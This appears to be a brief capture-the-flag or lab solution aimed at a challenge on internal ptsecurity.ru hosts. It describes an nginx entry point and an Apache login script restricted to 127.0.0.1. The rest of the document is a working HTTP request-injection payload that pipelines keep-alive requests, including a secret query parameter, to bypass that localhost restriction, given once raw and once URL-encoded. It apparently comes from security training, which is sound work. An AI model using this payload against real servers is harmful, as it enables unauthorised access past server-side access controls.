Entry point on nginx
http://db7-ubuntu.rd.ptsecurity.ru:533/ErsSma/ErsSma.php

Login script on Apache works only for IP 127.0.0.1
http://db7-ubuntu.rd.ptsecurity.ru:5337/ErsSma/index.php

Example exploit start
---
x1<error>x2 HTTP/1.0
Content-Length: 0
Connection: keep-alive
Keep-Alive: 300

GET /ErsSma/index.php HTTP/1.0
Content-Length: 0
Connection: keep-alive
Keep-Alive: 300

GET /ErsSma/index.php?s3cr3t=tru3 HTTP/1.0
Content-Length: 0
Connection: keep-alive
Keep-Alive: 300

GET /ErsSma/index.php?username=x3</error>x4 HTTP/1.0
Content-Length: 0
Connection: close
---
Example exploit end

Encoded exploit:
login=x1%3Cerror%3Ex2%20HTTP%2f1.0%0AContent-Length%3A%200%0AConnection%3A%20keep-alive%0AKeep-Alive%3A%20300%0A%0AGET%20%2fErsSma%2findex.php%20HTTP%2f1.0%0AContent-Length%3A%200%0AConnection%3A%20keep-alive%0AKeep-Alive%3A%20300%0A%0AGET%20%2fErsSma%2findex.php%3Fs3cr3t%3Dtru3%20HTTP%2f1.0%0AContent-Length%3A%200%0AConnection%3A%20keep-alive%0AKeep-Alive%3A%20300%0A%0AGET%20%2fErsSma%2findex.php%3Fusername%3Dx3%3C%2ferror%3Ex4%20HTTP%2f1.0%0AContent-Length%3A%200%0AConnection%3A%20close